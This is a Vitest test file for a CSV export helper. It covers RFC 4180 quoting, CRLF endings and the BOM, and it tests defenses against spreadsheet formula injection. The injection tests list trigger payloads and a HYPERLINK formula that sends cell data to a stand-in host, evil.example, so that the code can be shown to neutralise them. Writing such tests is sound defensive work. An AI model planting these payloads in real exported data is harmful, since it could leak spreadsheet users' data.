import { describe, expect, it } from 'vitest';
import { BOM, csvCell, csvRow } from '../../src/lib/csv';

describe('csv quoting (RFC 4180)', () => {
  it('leaves a plain value alone', () => {
    expect(csvCell('hello')).toBe('hello');
  });

  it('renders null and undefined as empty', () => {
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });

  it('quotes a value containing a comma', () => {
    expect(csvCell('ryoko, part two')).toBe('"ryoko, part two"');
  });

  it('doubles embedded quotes and wraps', () => {
    expect(csvCell('he said "no"')).toBe('"he said ""no"""');
  });

  it('quotes across newlines so a row cannot split', () => {
    expect(csvCell('line one\nline two')).toBe('"line one\nline two"');
    expect(csvCell('cr\r')).toBe('"cr\r"');
  });

  it('keeps unicode intact', () => {
    expect(csvCell('ryōkō')).toBe('ryōkō');
  });

  it('emits CRLF line endings', () => {
    expect(csvRow(['a', 'b'])).toBe('a,b\r\n');
  });

  it('has a BOM available so Excel reads UTF-8', () => {
    expect(BOM).toBe('\uFEFF');
    expect(BOM.length).toBe(1);
  });
});

describe('csv formula injection', () => {
  // A title or an email local-part is attacker-influenced text. Excel and
  // Sheets execute a cell that starts with one of these.
  it.each(['=1+1', '+1', '-1', '@SUM(A1)', '\tlead', '\rlead'])(
    'neutralises %j with a leading apostrophe',
    (payload) => {
      expect(csvCell(payload).replace(/^"/, '').startsWith("'")).toBe(true);
    },
  );

  it('neutralises the classic HYPERLINK exfil payload', () => {
    const cell = csvCell('=HYPERLINK("http://evil.example/?"&A1,"click")');
    expect(cell.startsWith(`"'=HYPERLINK`)).toBe(true);
  });

  it('does not mangle a value that merely contains an equals sign', () => {
    expect(csvCell('a=b')).toBe('a=b');
  });

  it('does not treat a normal email as a formula', () => {
    expect(csvCell('fan@example.com')).toBe('fan@example.com');
  });
});
